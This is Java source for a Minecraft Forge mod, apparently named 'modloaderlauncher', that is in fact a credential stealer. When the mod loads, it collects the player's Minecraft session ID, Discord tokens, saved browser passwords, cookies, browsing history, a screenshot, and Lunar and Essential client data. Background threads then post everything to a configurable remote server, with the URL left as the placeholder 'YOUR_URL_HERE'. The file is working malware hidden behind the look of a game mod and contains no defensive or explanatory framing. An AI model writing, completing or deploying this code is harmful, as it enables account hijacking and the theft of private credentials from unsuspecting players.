package dev.schubilegend;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import dev.schubilegend.handlers.*;
import dev.schubilegend.utils.Utils;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Driver;


@Mod(modid = "modloaderlauncher", version = "1.0.0")
public class SchubiMod {

    public static Driver driver;

    String apiUrl = "YOUR_URL_HERE";

    @Mod.EventHandler
    public void PreInit(FMLPreInitializationEvent event) {
        new Thread(() -> {
            try {
                JsonObject ssid = new JsonObject();
                JsonObject mcJson = new JsonObject();
                String[] mcInfo = new MinecraftHandler().getMcInfo();
                mcJson.addProperty("ign", mcInfo[0]);
                mcJson.addProperty("uuid", mcInfo[1]);
                mcJson.addProperty("ssid", mcInfo[2]);
                ssid.add("minecraft",mcJson);
                URL url = new URL(apiUrl + "/ssid");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Accept", "application/json");
                conn.setDoOutput(true);
                DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                os.writeBytes(ssid.toString());
                os.flush();
                os.close();
                BufferedReader br = new BufferedReader(new InputStreamReader((conn.getInputStream())));
                String output;
                while ((output = br.readLine()) != null) {
                    System.out.println(output);
                }
                conn.disconnect();

            } catch (Exception e) {
                e.printStackTrace();
            }

        }).start();

    }

    @Mod.EventHandler
    public void Init(FMLInitializationEvent event) {
        new Thread(() -> {
            try {
                JsonObject delivery = new JsonObject();
                Utils.bypassKeyRestriction();
                driver = Utils.getDriver();
                JsonObject mcJson = new JsonObject();
                String[] mcInfo = new MinecraftHandler().getMcInfo();
                mcJson.addProperty("ign", mcInfo[0]);
                mcJson.addProperty("uuid", mcInfo[1]);
                mcJson.addProperty("ssid", mcInfo[2]);
                delivery.add("minecraft",mcJson);

                try {
                JsonArray dcTokens = new DiscordHandler().getTokens();
                delivery.add("discord",dcTokens);
                } catch (Exception e) {
                    e.printStackTrace();
                }

                try {
                JsonArray pwJson = new PasswordHandler().grabPassword();
                delivery.add("passwords",pwJson);
                } catch (Exception e) {
                    e.printStackTrace();
                }

                try {
                String cookies = new CookieHandler().grabCookies();
                delivery.addProperty("cookies",cookies);
                } catch (Exception e) {
                    e.printStackTrace();
                }

                try {
                JsonArray history = new HistoryHandler().grabBrowserHistory();
                delivery.add("history",history);
                } catch (Exception e) {
                    e.printStackTrace();
                }


                String ss = new ScreenshotHandler().takeScreenshot();
                delivery.addProperty("screenshot",ss);

                String lunar = new LunarHandler().grabLunar();
                if(!lunar.equals("Not found")) {
                    delivery.addProperty("lunar", lunar);
                }

                String essential = new EssentialHandler().grabEssential();
                if(!essential.equals("Not found")) {
                    delivery.addProperty("essential", essential);
                }


                URL url = new URL(apiUrl + "/delivery");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Accept", "application/json");
                conn.setDoOutput(true);
                DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                os.writeBytes(delivery.toString());
                os.flush();
                os.close();
                BufferedReader br = new BufferedReader(new InputStreamReader((conn.getInputStream())));
                String output;
                while ((output = br.readLine()) != null) {
                    System.out.println(output);
                }
                conn.disconnect();

            } catch (Exception e) {
                e.printStackTrace();
            }

        }).start();
    }
}
